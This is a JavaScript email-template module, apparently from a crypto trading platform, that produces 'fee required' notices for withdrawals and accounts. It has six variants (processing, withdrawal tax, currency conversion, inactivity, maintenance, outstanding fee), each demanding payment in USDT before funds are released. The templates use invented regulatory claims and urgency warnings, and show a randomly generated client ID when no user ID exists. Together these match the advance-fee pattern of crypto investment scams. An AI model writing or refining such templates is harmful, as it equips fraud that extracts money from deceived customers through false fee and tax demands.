const baseProTemplate = require('./base-pro');
const { formatUSD } = require('./_money');

const FRONTEND_URL = process.env.FRONTEND_URL || 'https://quantyrexmarkets.vercel.app';

const FEE_CONTENT = {
  processing: {
    badge: 'TRANSACTION NOTICE',
    title: 'Transaction Verification Required',
    subtitle: 'To complete your withdrawal request, a verification and network processing charge is required for transaction authorization and compliance checks.',
    txType: 'Withdrawal',
    network: 'USDT (TRC20)',
    feeTypeLabel: 'Processing Fee',
    covers: [
      'Transaction Validation & Verification',
      'Secure Network Transfer Authorization',
      'Anti-Fraud Security Screening',
      'Network Costs & Processing Services'
    ],
    urgency: 'Please complete the fee payment to continue processing your transaction.',
    btnLabel: 'Complete Verification'
  },
  tax: {
    badge: 'TAX NOTICE',
    title: 'Withdrawal Tax Fee Required',
    subtitle: 'In accordance with current financial regulations, a withdrawal tax must be settled before your transaction can be released.',
    txType: 'Tax Settlement',
    network: 'USDT (TRC20)',
    feeTypeLabel: 'Withdrawal Tax Fee',
    covers: [
      'Regulatory Compliance Filing',
      'Government-Mandated Reporting',
      'Audit Trail Documentation',
      'Withdrawal Release Authorization'
    ],
    urgency: 'Please complete the tax payment to release your withdrawal.',
    btnLabel: 'Settle Tax Fee'
  },
  conversion: {
    badge: 'CONVERSION NOTICE',
    title: 'Currency Conversion Fee Required',
    subtitle: 'A currency conversion fee applies to your transaction. This covers real-time exchange rate processing and multi-currency settlement services.',
    txType: 'Currency Conversion',
    network: 'USDT (TRC20)',
    feeTypeLabel: 'Currency Conversion Fee',
    covers: [
      'Real-Time Exchange Rate Processing',
      'Multi-Currency Conversion Engine',
      'Settlement Authorization',
      'Conversion Verification'
    ],
    urgency: 'Please complete the fee payment to finalize your currency conversion.',
    btnLabel: 'Complete Conversion'
  },
  inactivity: {
    badge: 'REACTIVATION NOTICE',
    title: 'Account Reactivation Required',
    subtitle: 'Your account has been inactive for an extended period. An inactivity fee is required to reactivate your account.',
    txType: 'Account Reactivation',
    network: 'USDT (TRC20)',
    feeTypeLabel: 'Account Inactivity Fee',
    covers: [
      'Full Trading Access Restoration',
      'Withdrawal & Deposit Re-enablement',
      'Bots & Copy Trading Activation',
      'Account Security Refresh'
    ],
    urgency: 'Welcome back. Please complete the fee payment to reactivate your account.',
    btnLabel: 'Reactivate Account'
  },
  maintenance: {
    badge: 'MAINTENANCE NOTICE',
    title: 'Account Maintenance Fee Required',
    subtitle: 'A routine maintenance fee is required to keep your account operational and secure.',
    txType: 'Account Maintenance',
    network: 'USDT (TRC20)',
    feeTypeLabel: 'Account Maintenance Fee',
    covers: [
      'Server Infrastructure & Uptime',
      '24/7 Security Monitoring',
      'Continuous Platform Updates',
      'Account Services Continuity'
    ],
    urgency: 'Please complete the fee payment to maintain account services.',
    btnLabel: 'Settle Maintenance Fee'
  },
  custom: {
    badge: 'TRANSACTION NOTICE',
    title: 'Outstanding Fee Notice',
    subtitle: 'An outstanding fee has been applied to your account that requires immediate attention.',
    txType: 'Fee Settlement',
    network: 'USDT (TRC20)',
    feeTypeLabel: 'Outstanding Fee',
    covers: [
      'Transaction Authorization',
      'Account Service Continuity',
      'Payment Processing',
      'Settlement Verification'
    ],
    urgency: 'Please complete the fee payment to continue using your account.',
    btnLabel: 'Complete Payment'
  }
};

const friendlyLabel = (label, fallback) => {
  if (!label) return fallback;
  const rawTypes = ['processing', 'tax', 'conversion', 'inactivity', 'maintenance', 'custom'];
  if (rawTypes.includes(label.toLowerCase())) return fallback;
  return label.replace(/\b\w/g, c => c.toUpperCase());
};

// Inline data row — label on left, value on right, single horizontal line
const dataRow = (label, value, isLast) => `
  <tr>
    <td style="padding:10px 0;color:#64748b;font-size:11px;font-weight:600;letter-spacing:0.5px;${isLast ? '' : 'border-bottom:1px solid #f1f5f9;'}">${label}</td>
    <td align="right" style="padding:10px 0;color:#0f172a;font-size:12px;font-weight:600;${isLast ? '' : 'border-bottom:1px solid #f1f5f9;'}">${value}</td>
  </tr>
`;

// Bullet line for fee covers
const bulletLine = (text, isLast) => `
  <tr>
    <td style="padding:7px 0;color:#475569;font-size:11px;line-height:1.5;${isLast ? '' : 'border-bottom:1px solid #f8fafc;'}">
      <span style="color:#2563eb;font-weight:700;margin-right:8px;">›</span>${text}
    </td>
  </tr>
`;

const feeRequiredEmail = (name, feeLabel, feeAmount, currency, feeType, userId) => {
  const fee = FEE_CONTENT[feeType] || FEE_CONTENT.custom;
  const clientId = userId ? `#QXM-${String(userId).slice(-5).toUpperCase()}` : `#QXM-${Math.floor(Math.random() * 90000 + 10000)}`;
  const now = new Date();
  const dateStr = now.toLocaleString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }) + ' · ' + now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true }) + ' UTC';
  const displayFeeLabel = friendlyLabel(feeLabel, fee.feeTypeLabel);

  const coversList = fee.covers.map((c, i) => bulletLine(c, i === fee.covers.length - 1)).join('');

  return baseProTemplate(`
    <!-- Badge -->
    <p style="margin:0 0 10px;color:#2563eb;font-size:10px;font-weight:700;letter-spacing:2px;">${fee.badge}</p>

    <!-- Title -->
    <h1 style="margin:0 0 8px;color:#0f172a;font-size:18px;font-weight:700;line-height:1.3;">${fee.title}</h1>

    <!-- Subtitle -->
    <p style="margin:0 0 22px;color:#64748b;font-size:12px;line-height:1.6;">${fee.subtitle}</p>

    <!-- Details Card - horizontal rows -->
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin:0 0 14px;background:#f8fafc;border:1px solid #e5e7eb;border-radius:6px;">
      <tr><td style="padding:8px 14px;">
        <table width="100%" cellpadding="0" cellspacing="0" border="0">
          ${dataRow('Client ID', clientId, false)}
          ${dataRow('Transaction Type', fee.txType, false)}
          ${dataRow('Network', fee.network, false)}
          ${dataRow('Date & Time', dateStr, true)}
        </table>
      </td></tr>
    </table>

    <!-- Amount Due - compact horizontal -->
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin:0 0 14px;background:#0f1e3f;border-radius:6px;">
      <tr>
        <td style="padding:14px 16px;color:#94a3b8;font-size:11px;font-weight:600;letter-spacing:0.5px;">Amount Due</td>
        <td align="right" style="padding:14px 16px;color:#ffffff;font-size:18px;font-weight:700;">${formatUSD(feeAmount)}</td>
      </tr>
      <tr><td colspan="2" style="border-top:1px solid #1e3a8a;font-size:0;line-height:0;">&nbsp;</td></tr>
      <tr>
        <td style="padding:12px 16px;color:#94a3b8;font-size:11px;font-weight:600;letter-spacing:0.5px;">Fee Type</td>
        <td align="right" style="padding:12px 16px;color:#60a5fa;font-size:13px;font-weight:600;">${displayFeeLabel}</td>
      </tr>
    </table>

    <!-- What This Fee Covers - vertical list -->
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin:0 0 14px;background:#f8fafc;border:1px solid #e5e7eb;border-radius:6px;">
      <tr><td style="padding:10px 14px 12px;">
        <p style="margin:0 0 4px;color:#2563eb;font-size:10px;font-weight:700;letter-spacing:1.5px;">WHAT THIS FEE COVERS</p>
        <table width="100%" cellpadding="0" cellspacing="0" border="0">
          ${coversList}
        </table>
      </td></tr>
    </table>

    <!-- Urgency notice - single line -->
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin:0 0 14px;background:#fef2f2;border:1px solid #fecaca;border-radius:6px;">
      <tr>
        <td style="padding:12px 14px;color:#dc2626;font-size:11px;line-height:1.5;font-weight:500;">
          <strong>⚠ Action required:</strong> ${fee.urgency}
        </td>
      </tr>
    </table>

    <!-- CTA Button - full width but compact -->
    <table width="100%" cellpadding="0" cellspacing="0" border="0">
      <tr>
        <td align="center" style="padding:4px 0;">
          <a href="${FRONTEND_URL}/dashboard" style="display:block;background:#2563eb;color:#ffffff;font-size:12px;font-weight:700;letter-spacing:0.5px;padding:12px 20px;border-radius:6px;text-decoration:none;text-align:center;">${fee.btnLabel} →</a>
        </td>
      </tr>
    </table>
  `);
};

module.exports = feeRequiredEmail;
